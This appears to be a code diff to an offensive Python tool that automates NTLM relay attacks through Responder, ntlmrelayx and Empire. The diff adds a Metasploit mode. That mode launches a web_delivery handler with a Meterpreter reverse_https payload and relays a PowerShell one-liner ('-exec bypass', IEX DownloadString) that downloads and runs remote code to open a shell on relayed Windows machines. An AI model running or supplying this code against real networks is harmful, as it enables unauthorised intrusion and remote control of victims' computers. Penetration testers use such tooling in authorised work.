@@ -33,7 +33,7 @@ def main():
     parser.add_argument('target_ip', help='Target IP / Range / Subnet (nmap format)',
                         nargs='?', default = ''
     )
-    parser.add_argument('--port', '-p', help='Port for Empire listener (443)',
+    parser.add_argument('--port', '-p', help='Port for Empire listener / MSF web handler (443)',
                         default='443'
     )
     
@@ -44,6 +44,9 @@ def main():
     )
     parser_command.add_argument('--empire', help='Start Empire listener as relay target',
                         action='store_const', dest='action', const='empire'
+    )
+    parser_command.add_argument('--msf', help='Start Metasploit listener as relay target',
+                        action='store_const', dest='action', const='msf'
     )
     parser_command.add_argument('--deathstar', help='Start Empire listener as relay target with Deathstar autopwn',
                         action='store_const', dest='action', const='deathstar'
@@ -64,6 +67,8 @@ def main():
     host_ip = args.host_ip
     target_ip = args.target_ip
     empire_lport = args.port
+    msf_srvport = args.port
+    msf_lport = '8443'
     action=args.action
     disable_mimikatz = args.disable_mimikatz
     disable_domain_privesc = args.disable_domain_privesc
@@ -72,18 +77,27 @@ def main():
         launch_relayx=False
         launch_empire=False
         launch_deathstar=False
+        launch_msf=False
     elif action=='empire':
         launch_relayx=True
         launch_empire=True
         launch_deathstar=False
+        launch_msf=False
     elif action=='deathstar':
         launch_relayx=True
         launch_empire=True
         launch_deathstar=True
+        launch_msf=False
+    elif action=='msf':
+        launch_relayx=True
+        launch_empire=False
+        launch_deathstar=False
+        launch_msf=True
     else:
         launch_relayx=True
         launch_empire=False
         launch_deathstar=False
+        launch_msf=False
         relayx_command=action
     
     if not host_ip:
@@ -142,7 +156,17 @@ def main():
         print("Stager: " + empire_stager)
         
         relayx_command = empire_stager
-    
+        
+    if launch_msf:
+        command = 'msfconsole -q -x "use exploit/multi/script/web_delivery; set target 2; set uripath /; set ssl true; set srvport %s; set payload windows/meterpreter/reverse_https; set exitonsession false; set lhost %s; set lport %s; set enablestageencoding true; set autorunscript migrate -f; exploit -j -z"' % (msf_srvport, host_ip, msf_lport)
+        
+        tmux_pane = tmux_pane.split_window()
+        tmux_pane.send_keys(command)
+        time.sleep(10)
+        
+        relayx_command = 'powershell -nop -exec bypass -c "IEX((New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/jaredhaight/Invoke-MetasploitPayload/master/Invoke-MetasploitPayload.ps1\'); Invoke-MetasploitPayload \'https://%s:%s/\'"' % (host_ip, msf_srvport)
+        
+        
     if launch_relayx:
         for line in fileinput.input("/opt/Responder/Responder.conf", inplace=True):
             line=line.replace("SMB = On","SMB = Off")
